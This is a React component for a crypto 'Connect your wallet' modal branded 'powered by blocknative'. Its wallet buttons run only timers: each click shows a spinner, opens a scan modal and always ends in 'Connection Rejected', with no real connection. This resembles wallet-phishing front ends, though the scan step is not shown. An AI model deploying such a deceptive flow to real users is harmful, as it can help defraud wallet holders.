import React, { useContext, useState } from 'react';
import Backdrop from '@mui/material/Backdrop';
import Box from '@mui/material/Box';
import Modal from '@mui/material/Modal';
import Fade from '@mui/material/Fade';
import Typography from '@mui/material/Typography';
import { CloseButton, InfoFilledIcon } from '../assets/icons';
import { myContext } from '../MyContext';
import { coinbaseLogo, logo, walletConnecLogo } from '../assets/images';
import Spinner from './spinner';
import ScanWalletModal from './scanModal';

export const style = {
    position: 'absolute',
    top: '43%',
    left: '50%',
    height: "440px",
    transform: 'translate(-50%, -50%)',
    borderRadius: "15px",
    marginTop: "2.5em",
    bgcolor: '#2E2E34',
    outline: "none",
    boxShadow: 24,
};

export const styleHeader = {
    borderBottom: '1px solid rgb(63 63 70)',
    p: 1,
    color: "rgb(161 161 170)",
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center"
}

export default function ConnectWalletModal() {
    const { openWalletModal, setWalletModal, setScanWalletModal } = useContext(myContext)
    const [clickedWalletIndex, setClickedWalletIndex] = useState();
    const [isRejected, setIsRejected] = useState(false)
    const [clickedWalletLogo, setClickedWalletLogo] = useState()

    const handleClose = () => setWalletModal(false);

    const avalWallets = [
        {
            logo: coinbaseLogo,
            name: "Coinbase Wallet"
        },
        {
            logo: walletConnecLogo,
            name: "WalletConnect"
        },
    ]

    function handleWalletClick(name) {
        setClickedWalletIndex(name)
        setTimeout(() => {
            setScanWalletModal(true)
            setTimeout(() => {
                setIsRejected(true)
            }, 3000);
        }, 2000);
    }

    function backToWallets() {
        setClickedWalletIndex()
        setIsRejected(false)
    }


    return (
        <Modal
            aria-labelledby="transition-modal-title"
            aria-describedby="transition-modal-description"
            open={openWalletModal}
            onClose={handleClose}
            closeAfterTransition
            slots={{ backdrop: Backdrop }}
            slotProps={{
                backdrop: {
                    timeout: 500,
                },
            }}
        >
            <Fade in={openWalletModal}>
                <Box className=" smm:w-[800px] w-[90%] overflow-hidden m-auto flex" sx={style}>
                    <Box className="bg-[#34353B] w-[39%]">
                        <div className='w-[70%] m-auto pt-16'>
                            <img src={logo} alt='logo' className='w-[17px]' />
                            <div className='py-6 text-[#DCEFFA]'>
                                <header className='mb-4'>Connect your wallet</header>
                                <div className='text-sm'>Connecting your wallet is like “logging in” to Web3. Select your wallet from the options to get started.</div>
                            </div>
                            <div className='flex items-center text-sm gap-2 ps-4 text-[#6370E5]'>
                                <p>I don't have a wallet </p>
                                <InfoFilledIcon className='text-2xl' />
                            </div>

                            <div className='relative mt-24 mb-4 w-[90%] m-auto'>
                                <div className=' flex justify-between items-center'>
                                    <div className='h-3 w-3 z-10 bg-[#6370E5] rounded-full border-[#1A1D26] border-2'></div>
                                    {/* <div className='h-3  w-3 z-10 bg-[#6370E5] rounded-full border-[#1A1D26] border-2'></div> */}
                                    {/* <div className='h-3 top-[-5px] w-3 z-10 bg-[#6370E5] rounded-full border-[#1A1D26] border-2'></div> */}
                                    <div className='h-2  top-[0px] w-2 z-10 bg-[#1A1D26] rounded-full'></div>
                                    <div className='h-2  top-[0px] w-2 z-10 bg-[#1A1D26] rounded-full'></div>
                                </div>
                                <div className='absolute top-1/2 w-full h-[2px] bg-[#1A1D26]'></div>
                            </div>
                            <div className='text-[#DCEFFA] text-[12px] text-center'>powered by <b>blocknative</b></div>
                        </div>
                    </Box>


                    <Box className="w-[61%] relative">
                        <Box sx={styleHeader}>
                            <Typography className='text-white ps-2'> {!isRejected ? "Available Wallets (2)" : "Connection Rejected"} </Typography>
                            <CloseButton onClick={handleClose} className='text-[32px] shadow-sm cursor-pointer bg-[#34353B] p-1 rounded-full text-zinc-400' />
                        </Box>
                        <Box className="">
                            <div className='w-[94%] m-auto'>
                                {
                                    !isRejected && (
                                        <>
                                            <div className='text-[#DCEFFA] grid grid-cols-2 gap-2 pt-4'>
                                                {
                                                    avalWallets.map((wallet, index) => (
                                                        <div key={index} onClick={() => { handleWalletClick(wallet.name); setClickedWalletLogo(wallet.logo) }} className='border duration-500 rounded-2xl hover:bg-[#34353B] cursor-pointer p-4 border-zinc-700 flex items-center gap-2'>
                                                            <div className='border p-2 h-[3.1em] flex justify-center rounded-2xl border-zinc-600 w-[50px]'>
                                                                {
                                                                    clickedWalletIndex === wallet.name ? (
                                                                        <Spinner />
                                                                    ) : (
                                                                        <img src={wallet.logo} alt='' className=' w-full object-contain ' />
                                                                    )
                                                                }
                                                            </div>
                                                            <div>{wallet.name}</div>
                                                        </div>
                                                    ))
                                                }
                                            </div>

                                            <div className='flex justify-between bg-[#FFEFCC] rounded-xl p-3 mt-2'>
                                                <div className='text-[12px] text-[#6370E5]'>
                                                    <div className='text-[#71530F]'>Why don't I see my wallet?</div>
                                                    <div >Click here to learn more</div>
                                                </div>
                                                <InfoFilledIcon className='text-[#664600] text-[20px]' />
                                            </div>
                                        </>
                                    )
                                }
                                {
                                    isRejected && (
                                        <>
                                            <div className='flex gap-12 bg-[#FFEFCC] rounded-3xl p-4 mt-4'>
                                                <div className='flex items-center relative '>
                                                    <div className='w-[40px] border flex justify-center items-center rounded-xl bg-[#EBEBED] border-[#FFAF00] h-[40px]'>
                                                        <img src={logo} alt='wallet' className='w-1/2' />
                                                    </div>
                                                    <div className='w-[40px] border absolute right-[-2em] flex justify-center items-center rounded-xl bg-white border-[#FFAF00] h-[40px]'>
                                                        <img src={clickedWalletLogo} alt='wallet' className='w-1/2' />
                                                    </div>
                                                </div>
                                                <div className='text-[12px] text-[#6370E5]'>
                                                    <div className='text-[#71530F] text-[16px]'>Connection Rejected!</div>
                                                    <div>Click here to try again</div>
                                                </div>
                                            </div>
                                            <div onClick={backToWallets} className=' bottom-8 absolute flex justify-center items-center w-full '>
                                                <button className='bg-[#FFFFFF]  text-[13px] px-4 font-bold text-[#33394B] py-1 rounded-full'>
                                                    Back to wallets
                                                </button>
                                            </div>
                                        </>
                                    )
                                }
                            </div>
                            <ScanWalletModal />
                        </Box>
                    </Box>
                </Box>
            </Fade>
        </Modal>
    );
}
